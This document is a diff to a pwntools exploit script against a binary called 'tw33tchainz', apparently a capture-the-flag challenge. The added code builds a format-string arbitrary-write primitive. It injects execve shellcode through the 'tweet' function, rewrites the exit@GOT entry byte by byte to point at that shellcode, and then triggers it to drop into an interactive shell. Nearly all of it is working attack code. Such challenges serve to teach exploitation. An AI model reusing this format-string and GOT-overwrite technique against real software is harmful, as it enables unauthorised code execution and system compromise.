@@ -4,6 +4,7 @@
 # $ pwn template tw33tchainz
 from pwn import *
 from re import search
+import ctypes
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('tw33tchainz')
@@ -44,6 +45,9 @@ libc =  ELF("/usr/lib32/libc.so.6")
 rop  =  ROP(libc)
 io = start()
 CHOICE_MSG = "Enter Choice: "
+
+def uint8(x):
+    return ctypes.c_uint8(x).value
 
 def crack_password():
     """
@@ -127,8 +131,10 @@ def get_chain_addresses():
 
     return list(match.groups())
 
-def write_byte(addr, value):
-    craft = "A{}%{}x%8$hnn".format(p32(addr), value - 5)
+def write_byte(addr, value, special=False):
+    if not special: value = uint8(uint8(value) - uint8(5))
+    craft = "A{}%{}x%8$hnn".format(p32(addr), value)
+
     log.info("Sending {} with len {}".format(craft, len(craft)))
     do_tweet(craft)
     log.info("Written {} at {}".format(hex(value), hex(addr)))
@@ -163,7 +169,12 @@ if not get_admin(secret):
 enable_debug_mode()
 
 # Now, we should write our shellcode into the memory, it need to be smaller than 16 bytes
-do_tweet("\xcc" * 16)
+shellcode = shellcraft.i386.execve(0xf7f370a8, 0, 0) # this value is available only if ASLR is off (TODO: leak addresses on ASLR too)
+log.info(shellcode)
+shellcode = asm(shellcode)
+
+
+do_tweet(shellcode)
 
 # Obtain shellcode address
 addresses = get_chain_addresses()
@@ -172,14 +183,16 @@ shellcode_addr = int(addresses[0], 16)
 # Rewrite the GOT
 exit_GOT = exe.got['exit']
 log.info("exit@GOT: " + hex(exit_GOT))
-for i in range(0, 4):
+for i in range(0, 3):
     to_write = (shellcode_addr >> (8 * i)) & 0xff
     log.info("Byte to write: " + hex(to_write))
     write_byte(exit_GOT + i, to_write)
+
+# For some strange reason the last byte needed a special way to be written :P
+write_byte(exit_GOT + 3, ((shellcode_addr >> 8*3) & 0xff)+251, True)
 
 # Call shellcode
 io.recvuntil(CHOICE_MSG)
 io.sendline("5")
 
 io.interactive()
-
